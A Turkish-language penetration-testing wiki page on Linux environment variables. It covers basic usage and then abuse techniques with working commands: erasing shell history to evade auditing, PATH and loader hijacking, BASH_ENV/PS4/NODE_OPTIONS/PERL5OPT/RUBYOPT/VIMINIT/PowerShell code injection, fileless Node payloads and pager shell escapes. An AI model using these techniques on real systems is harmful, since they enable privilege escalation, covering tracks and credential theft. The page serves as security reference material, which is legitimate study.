# Linux Ortam Değişkenleri

{{#include ../../banners/hacktricks-training.md}}

## Genel değişkenler

Genel değişkenler **alt süreçler** tarafından devralınır.

Şunu yaparak mevcut oturumunuz için genel bir değişken oluşturabilirsiniz:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

Bu değişkene mevcut oturumlarınızdan ve alt süreçlerinden erişilebilir.

Bir değişkeni şu şekilde **kaldırabilirsiniz**:

```bash
unset MYGLOBAL
```

## Yerel değişkenler

**Yerel değişkenlere** yalnızca **geçerli kabuk/betik** tarafından **erişilebilir**.

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## Mevcut değişkenleri listele

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ` içeriği **NUL ile ayrılmıştır**, bu nedenle aşağıdaki varyantları okumak genellikle daha kolaydır:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

If devralınan ortamlarda **credentials** veya **ilginç servis yapılandırmaları** arıyorsanız, [Linux Post Exploitation](../post-exploitation/README.md) sayfasına da göz atın.

## Yaygın değişkenler

Kaynak: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** tarafından kullanılan ekran. Bu değişken genellikle **:0.0** olarak ayarlanır; bu, mevcut bilgisayardaki ilk ekranı belirtir.
- **EDITOR** – kullanıcının tercih ettiği metin düzenleyicisi.
- **HISTFILESIZE** – history dosyasında bulunan en fazla satır sayısı.
- **HISTSIZE** – kullanıcı oturumunu sonlandırdığında history dosyasına eklenen satır sayısı.
- **HOME** – home dizininiz.
- **HOSTNAME** – bilgisayarın hostname değeri.
- **LANG** – mevcut diliniz.
- **MAIL** – kullanıcının posta kuyruğunun konumu. Genellikle **/var/spool/mail/USER**.
- **MANPATH** – man sayfalarını aramak için kullanılacak dizinlerin listesi.
- **OSTYPE** – işletim sistemi türü.
- **PS1** – bash içindeki varsayılan prompt.
- **PATH** – dosyanın göreli veya mutlak yolunu belirtmek yerine yalnızca adını belirterek çalıştırmak istediğiniz binary dosyaları içeren tüm dizinlerin yollarını saklar.
- **PWD** – mevcut çalışma dizini.
- **SHELL** – mevcut command shell'in yolu (örneğin, **/bin/bash**).
- **TERM** – mevcut terminal türü (örneğin, **xterm**).
- **TZ** – saat diliminiz.
- **USER** – mevcut kullanıcı adınız.

## Hacking için ilginç değişkenler

Her değişken aynı derecede yararlı değildir. Saldırgan bakış açısıyla, **arama yollarını**, **başlangıç dosyalarını**, **dynamic linker davranışını** veya **denetim/loglama** süreçlerini değiştiren değişkenlere öncelik verin.

### **HISTFILESIZE**

Oturumunuzu **sonlandırdığınızda** history dosyasının (\~/.bash_history) **0 satıra indirgenmesi** için bu **değişkenin değerini 0 olarak değiştirin**.

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

**Bu değişkenin değerini 0 olarak değiştirin**; böylece komutlar **bellek içi history'de tutulmaz** ve **history dosyasına** (\~/.bash_history) geri yazılmaz.

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

**Bu değişkenin değeri `ignorespace` veya `ignoreboth` olarak ayarlanırsa**, başına fazladan bir boşluk eklenen hiçbir komut geçmişe kaydedilmez.

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

**Geçmiş dosyasını** **`/dev/null`** konumuna yönlendirin veya değişkeni tamamen kaldırın. Bu, genellikle yalnızca geçmiş boyutunu değiştirmekten daha güvenilirdir.

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

Süreçler, **http veya https** üzerinden internete bağlanmak için burada tanımlanan **proxy**'yi kullanır.

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: bunu dikkate alan araçlar/protokoller için varsayılan proxy.
- `no_proxy`: doğrudan bağlanması gereken ana makineler/etki alanları/CIDR'lar için bypass listesi.

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Hem küçük hem de büyük harfli biçimler, kullanılan araca bağlı olarak kullanılabilir (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Süreçler **bu env değişkenlerinde** belirtilen sertifikalara güvenir. Bu, **`curl`**, **`git`**, Python HTTP istemcileri veya paket yöneticileri gibi araçların saldırganın kontrolündeki bir CA'ya güvenmesini sağlamak için kullanışlıdır (örneğin, bir interception proxy'yi meşru göstermek için).

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

Ayrıcalıklı bir wrapper/script komutları **mutlak yollar olmadan** çalıştırırsa, `PATH` içindeki **saldırganın kontrol ettiği ilk dizin** kullanılır. Bu, `sudo`, cron işleri, shell wrapper'ları ve özel SUID yardımcılarında görülen birçok **PATH hijack** saldırısının temel mekanizmasıdır. `env_keep+=PATH`, zayıf `secure_path` veya `tar`, `service`, `cp`, `python` gibi komutları adlarıyla çağıran wrapper'ları arayın.

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

PATH'i kötüye kullanan tam yetki yükseltme zincirleri için [Linux Privilege Escalation](linux-privilege-escalation/README.md) sayfasına bakın.

### **HOME & XDG_CONFIG_HOME**

`HOME` yalnızca bir dizin başvurusu değildir: birçok araç, `$HOME` veya `$XDG_CONFIG_HOME` konumlarından **dotfiles**, **plugins** ve **kullanıcı başına yapılandırmaları** otomatik olarak yükler. Ayrıcalıklı bir iş akışı bu değerleri koruyorsa, **config injection** ikili dosya ele geçirmeye kıyasla daha kolay olabilir.

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

İlginç hedefler arasında `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` ve `.terraformrc` gibi araca özgü dosyalar bulunur.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Bu değişkenler **dinamik bağlayıcıyı** etkiler:

- `LD_PRELOAD`: Ek paylaşımlı nesnelerin önce yüklenmesini zorlar.
- `LD_LIBRARY_PATH`: Kütüphane arama dizinlerini listenin başına ekler.
- `LD_AUDIT`: Kütüphane yüklemesini ve sembol çözümlemesini izleyen denetçi kütüphanelerini yükler.

Ayrıcalıklı bir komut bu değişkenleri koruyorsa, **hooking**, **instrumentation** ve **privilege escalation** için son derece değerlidirler. **Güvenli yürütme** modunda (`AT_SECURE`; ör. setuid/setgid/capabilities), yükleyici bu değişkenlerin çoğunu kaldırır veya kısıtlar. Ancak, hedef programdan **önce** çalıştıkları için yükleyicinin bu erken aşamasındaki ayrıştırıcı hataları hâlâ büyük etki yaratabilir.<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES`, glibc'nin erken aşamadaki davranışını değiştirir (örneğin, allocator ayarlarını) ve exploit laboratuvarlarında çok kullanışlıdır. Güvenlik açısından da önemlidir; çünkü **dynamic loader bu değişkeni çok erken ayrıştırır**. 2023'teki **Looney Tunables** hatası, loader'da ayrıştırılan tek bir environment variable'ın SUID programlarına karşı **yerel privilege-escalation primitive**'ine dönüşebileceğini hatırlattı.<sup>[[6]](#references)</sup>

CVE-2023-4911 için **kurulu dağıtım paketinin sürümünü**, üreticisinin düzeltilmiş sürümüyle karşılaştırın ve yeni süreçlerde gerçekten hangi loader'ın kullanıldığını doğrulayın. Yalnızca upstream sürüm numarasına bakmak güvenilir değildir: Debian, etkilenen ayrıştırıcıyı 2.31 paketine backport ederken bazı dağıtımlar upstream numarasını değiştirmeden düzeltmeleri backport etti. Gerçek bir privilege geçişi için ayrıca kimlik değişikliği `NoNewPrivs`, `nosuid` mount'u veya başka bir azaltım tarafından engellenmeyen, ayrıcalıklı bir hedef executable gerekir. Pasif enumeration sırasında hatalı biçimlendirilmiş bir `GLIBC_TUNABLES` çökme probunu çalıştırmaktan kaçının. Sürüme özel uygulanabilirlik bilgileri için [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) ve [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) sayfalarına bakın; Ubuntu'nun [güvenlik duyurusu](https://ubuntu.com/security/notices/USN-6409-1) güncellemeden sonra yeniden başlatma gerektiğini de belirtiyor.

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

**Bash** **etkileşimli olmayan** şekilde başlatılırsa hedef script'i çalıştırmadan önce `BASH_ENV` değerini kontrol eder ve belirtilen dosyayı `source` eder. Bash `sh` olarak çağrıldığında veya POSIX tarzı etkileşimli modda çalıştığında `ENV` de kontrol edilebilir. Bu, ortamın saldırganın kontrolünde olması durumunda bir shell wrapper'ı code execution'a dönüştürmenin klasik bir yoludur.

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash, **gerçek/etkin kimlikler farklı olduğunda** bu başlangıç dosyalarını yok sayar; `-p` etkin kimliği korur ancak bu başlangıç dosyalarını etkinleştirmez, bu nedenle kesin davranış wrapper’ın shell’i nasıl başlattığına bağlıdır. Bash’i başlatmadan önce `setuid()`/`setgid()` çağıran ayrıcalıklı wrapper’lara dikkat edin: Kimlikler yeniden eşleştiğinde Bash, aksi durumda yok sayacağı `BASH_ENV`, `ENV` ve ilgili shell durumuna güvenebilir.<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash, **xtrace** etkin olarak çalıştığında `PS4` değişkenini genişletir ve izlenen her komuttan önce yazdırır. `PS4`, bir istem gibi genişletilir; bu nedenle içindeki bir **command substitution** yürütülür. Önemli nokta şu ki xtrace, yalnızca ortamdan `SHELLOPTS=xtrace` dışa aktarılarak etkinleştirilebilir; komut satırında `-x` kullanılmasına gerek yoktur. Böylece kurbanın çalıştırdığı tüm Bash script’leri kod yürütmeye dönüşür.<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4`, xtrace etkin olana kadar hiçbir şey yapmaz (`SHELLOPTS=xtrace`, `set -x` veya `bash -x`); Bash, `BASH_ENV` gibi ayrıcalıklı/setuid bağlamlarda `SHELLOPTS` değişkenini de kaldırır.

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

Bu değişkenler Python'ın başlatılma şeklini değiştirir:

- `PYTHONPATH`: Arama yollarını import sırasının başına ekler.
- `PYTHONHOME`: Standart kütüphane ağacının konumunu değiştirir.
- `PYTHONSTARTUP`: Etkileşimli istemden önce bir dosya çalıştırır.
- `PYTHONINSPECT=1`: Bir betik tamamlandıktan sonra etkileşimli moda geçer.
- `PYTHONBREAKPOINT`: Kod `breakpoint()` noktasına ulaştığında `package.module.callable` çağrılır (ve modülü import edilir).<sup>[[8]](#references)</sup>

Bunlar, Python'ı kontrol edilebilir bir ortamla çağıran bakım betiklerine, debugger'lara, shell'lere ve wrapper'lara karşı kullanışlıdır. `python -E` ve `python -I`, tüm `PYTHON*` değişkenlerini yok sayar.

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

Yakın tarihli gerçek dünya örneklerinden biri, Ubuntu/Debian sistemlerini etkileyen 2024 **needrestart** LPE açığıydı: root sahibi tarayıcı, ayrıcalıksız bir sürecin `PYTHONPATH` değerini `/proc/<PID>/environ` dosyasından kopyalıyor ve ardından Python'ı çalıştırıyordu. Yayımlanan exploit, saldırganın denetimindeki yola `importlib/__init__.so` yerleştirerek Python'ın, helper'ın sabit kodlanmış betiği önem kazanmadan önce, kendi başlatma işlemi sırasında saldırganın kodunu çalıştırmasını sağlıyordu.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl'de de aynı derecede kullanışlı başlangıç değişkenleri vardır:

- `PERL5LIB`: Kütüphane dizinlerini arama sırasının başına ekler.
- `PERL5OPT`: Her `perl` komut satırına eklenmiş gibi seçenekler enjekte eder.

Bu, hedef betik ilginç bir şey yapmadan önce **automatic module loading** işlemini zorlayabilir veya interpreter davranışını değiştirebilir. Perl bu değişkenleri **taint / setuid / setgid** bağlamlarında yok sayar; ancak normal root-run wrapper'lar, CI işleri, yükleyiciler ve özel sudoers kuralları için hâlâ önem taşırlar.

Bir sudo kuralı ortam değişkenlerinin değiştirilmesine izin veriyorsa ve ayrıcalıklı komutu sonunda Perl'i başlatıyorsa, `PERL5DB` değişkenini de inceleyin. Perl belgelerine göre `PERL5OPT=-d`, debugger'ı başlatır; `PERL5DB` ise Perl yalnızca `-d` seçeneğiyle başlatıldığında debugger başlatma kodunu sağlar. Yalnızca `PERL5LIB` ve `PERLLIB` değişkenlerinin ayarını kaldırmak bu yolu kapatmaz. Değişkenlerin sudo ve wrapper üzerinden korunması, ayrıca Perl sürecinin taint veya set-ID işleme nedeniyle bunları yok saymaması gerekir; keşif sırasında ayrıcalıklı helper'ı çalıştırmadan tam kuralı ve yürütme zincirini inceleyin. Bkz. [perlrun's environment-variable reference](https://perldoc.perl.org/perlrun#ENVIRONMENT).

Perl'in yerleşik [`@INC` search path](https://perldoc.perl.org/perlvar#@INC) değeri, ortam değişkenleri korunmasa bile başka bir modül güven sınırıdır. Ayrıcalıklı bir Perl süreci için, gerçek bir `use` veya `require` ifadesini çözümlenen modül adı, arama sırası ve daha düşük ayrıcalıklı bir kullanıcının aranan dizinlerden birinde bu modülü oluşturma veya değiştirme olanağıyla birlikte değerlendirin. Tek başına yazılabilir bir kütüphane dizini, ayrıcalıklı sürecin oradan kod yükleyeceğini kanıtlamaz.

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS`, ortamı devralan her `node` işlemine **Node.js CLI flags** ekler. Bu nedenle, sonunda Node'u çalıştıran wrappers, CI işleri, Electron yardımcıları ve sudo kurallarına karşı kullanışlıdır. Saldırı amaçlı en ilgi çekici flag'ler genellikle şunlardır:

- `--require <file>`: hedef betikten önce bir CommonJS dosyası yükler.
- `--import <module>`: hedef betikten önce bir ES module yükler.

Node, `NODE_OPTIONS` içinde bazı tehlikeli flag'leri reddeder; ancak `--require` ve `--import` açıkça izin verilen flag'lerdir ve normal komut satırı argümanlarından **önce** işlenir.<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### `data:` URL ile dosyasız preload

`NODE_OPTIONS` değerini ayarlayabiliyor ancak hedefte **dosya yazamıyorsanız** (salt okunur dosya sistemi, kısıtlı API, serverless runtime vb.), `--import` bir `data:text/javascript,` URL’sini kabul eder; böylece payload’ın tamamı ortam değişkeninin içinde taşınır. JavaScript **tamamen URL-encoded** olmalıdır — Node değeri bir URL olarak ayrıştırır; bu nedenle kodlanmamış herhangi bir boşluk (veya başka bir karakter) payload’ı keser ve `SyntaxError` hatasına yol açar. Bu yöntem, `--import` seçeneğinin `NODE_OPTIONS` allowlist’inde bulunduğu Node 20.6+ sürümlerinde çalışır.<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> Bu, fonksiyonları Node çalıştıran **yönetilen bulut runtime'larında** `NODE_OPTIONS` kontrolünü RCE'ye dönüştürmenin yaygın bir yoludur. Örneğin, yalnızca bir Lambda'nın yapılandırmasını değiştirebilen (`lambda:UpdateFunctionConfiguration`, `iam:PassRole` yok, kod güncellemesi yok) bir saldırgan, fonksiyon içinde kod çalıştırmak ve execution role kimlik bilgilerini çalmak için `NODE_OPTIONS=--import data:text/javascript,<payload>` enjekte edebilir. Enjekte edilen modül handler'dan **önce** çalışır; ardından handler normal şekilde çalışmaya devam eder.

`NODE_OPTIONS` değerini dolaylı olarak ayarlayan remote gadget chain'ler için (örneğin, RCE'ye yol açan prototype pollution), [bu diğer sayfaya](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) bakın.

### **RUBYLIB & RUBYOPT**

Ruby de aynı türde bir başlangıç suistimali olanağı sunar:

- `RUBYLIB`: Ruby'nin load path'ine dizinleri başa ekler.
- `RUBYOPT`: Her `ruby` çağrısına `-r` gibi komut satırı seçenekleri enjekte eder.

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024'teki **needrestart** güvenlik açıkları, bunun yalnızca laboratuvarda işe yarayan bir numara olmadığını gösterdi: `PYTHONPATH` kötüye kullanımına karşı savunmasız olan aynı root-owned helper, saldırganın denetimindeki `RUBYLIB` ile Ruby çalıştırmaya ve saldırganın bir dizinindeki `enc/encdb.so` dosyasını yüklemeye de zorlanabiliyordu.<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim, normal başlangıç sırasında `VIMINIT` (veya yedek olarak `EXINIT`) içindeki Ex komutlarını çalıştırır. Ex komutları arasında `:!cmd` ve `:call system(...)` bulunur; dolayısıyla bu değişkeni denetlemek, bir kurban Vim'i her açtığında kod çalıştırılmasını sağlar (`sudo vim` ile root olarak Vim açma, `crontab -e`, `visudo`, `$EDITOR`'ı başlatan `git`/`less` vb.).<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) bu değişkenleri atlar, ancak normal bir etkileşimli başlangıçta bunlar çalıştırılır.

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) Linux/macOS (ve Windows) üzerinde çalışır ve bir **.NET uygulamasıdır**; bu nedenle çeşitli environment variable'lar, devralınan bir environment ile yapılan her `pwsh` çağrısını code execution'a dönüştürebilir. Bu, `pwsh` çağıran cron/systemd işleri, CI runner'lar ve ayrıcalıklı wrapper'lara karşı kullanışlıdır.

- `PSModulePath`: PowerShell, bu listedeki her dizini `.psd1`/`.psm1` modülleri için yinelemeli olarak arar ve dışa aktardığı bir komuta ilk kez başvurulduğunda modülü **otomatik yükler**. Bir dizini listenin başına ekleyin; modülünüzün üst düzey kodu import sırasında çalışır. Çözümleme sırası *Alias → Function → Cmdlet* olduğundan, dışa aktarılan bir function, kurbanın çağırdığı yerleşik bir cmdlet'i bile gölgeleyebilir.<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: başlangıçta çalıştırılan `powershell/Microsoft.PowerShell_profile.ps1` dosyasının konumunu değiştirir (`-NoProfile` kullanılmadığı sürece).
- `DOTNET_STARTUP_HOOKS`: `Main` öncesinde `StartupHook.Initialize()` çalışan managed assembly (tüm .NET uygulamaları tarafından paylaşılır).
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API'si, başlangıçta saldırganın library'sini sürece yükler (path değişkenleri registry'den önceliklidir; `DOTNET_*` daha yeni takma addır). Windows PowerShell 5.1'de (.NET Framework), `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` kullanın. MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Windows'ta `PSExecutionPolicyPreference=Bypass`, ek olarak "imzasız betikler engellendi" güvenlik önlemini kaldırır; böylece yerleştirilmiş bir profil/modül gerçekten çalışır. Eksiksiz PoC'ler için özel sayfaya bakın:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Bazı araçlar bir yolu yalnızca ortamdan okumakla kalmaz; değeri bir **shell**'e, **editor**'e veya **girdi ön işlemcisine** iletir. Bu nedenle, ayrıcalıklı bir wrapper `git`, `man`, `less` veya benzer metin görüntüleyicileri çalıştırdığında aşağıdaki değişkenler özellikle ilgi çekici hâle gelir:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager komutunu seçer.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: genellikle bağımsız değişkenlerle birlikte editor komutunu seçer.
- `LESSOPEN`, `LESSCLOSE`: `less` bir dosyayı açtığında çalışan ön/son işlemcileri tanımlar.

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git ayrıca diske dokunmadan, `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` ve `GIT_CONFIG_VALUE_<n>` aracılığıyla **yalnızca ortam değişkenleriyle config injection** özelliğini destekler:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Post-exploitation açısından, miras alınan ortamların sıklıkla **kimlik bilgileri**, **proxy ayarları**, **servis token'ları** veya **bulut anahtarları** içerdiğini de unutmayın. `/proc/<PID>/environ` ve `systemd` `Environment=` aramaları için [Linux Post Exploitation](../post-exploitation/README.md) sayfasına bakın.

### PS1

İsteminizin görünümünü değiştirin.

[**Bu bir örnektir**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Bu bir örnektir](<../images/image (897).png>)

Normal kullanıcı:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir, iki ve üç iş](<../images/image (740).png>)

Arka planda çalışan bir, iki ve üç iş:

![PERL5OPT & PERL5LIB - PS1: Arka planda çalışan bir, iki ve üç iş](<../images/image (145).png>)

Arka planda bir iş, durmuş bir iş ve doğru şekilde tamamlanmamış son komut:

![PERL5OPT & PERL5LIB - PS1: Arka planda bir iş, durmuş bir iş ve doğru şekilde tamamlanmamış son komut](<../images/image (715).png>)

## References

- [1] [GNU Bash Kılavuzu - Bash Başlangıç Dosyaları](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux man sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart içindeki LPE'ler](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI belgeleri - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Yaygın ortam değişkenleri - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc'nin ld.so'sunda Yerel Yetki Yükseltme - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Kılavuzu - Bash Değişkenleri (`PS4`) ve Set Yerleşik Komutu (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Yerleşik breakpoint() ve PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim belgeleri - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath ve PowerShell modüllerinin otomatik yüklenmesi](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET hata ayıklama ve profil oluşturma yapılandırma ayarları (`CORECLR_`/`DOTNET_`/`COR_` profiler değişkenleri)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
